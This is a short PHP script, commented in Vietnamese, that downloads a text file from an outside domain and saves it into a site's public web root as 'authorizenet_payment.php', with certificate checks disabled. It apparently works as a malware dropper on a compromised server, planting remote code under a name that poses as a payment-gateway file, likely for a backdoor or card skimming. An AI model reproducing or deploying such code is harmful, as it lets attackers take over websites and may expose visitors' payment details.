// URL của file cần tải
$url = "https://dogebreedlist.info/app/report.txt";

// Đường dẫn lưu file
$savePath = "/home/cambodiaearrival/public_html/authorizenet_payment.php";

// Khởi tạo cURL session
$ch = curl_init($url);

// Mở file để ghi
$file = fopen($savePath, "w");

if ($file === false) {
    die("Không thể mở file để ghi.");
}

// Cấu hình cURL để ghi dữ liệu trực tiếp vào file
curl_setopt($ch, CURLOPT_FILE, $file);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

// Thực hiện tải file
$result = curl_exec($ch);

// Kiểm tra lỗi
if ($result === false) {
    echo "Lỗi cURL: " . curl_error($ch);
} else {
    echo "Tải file thành công!";
}

// Đóng cURL và file
curl_close($ch);
fclose($file);
?>
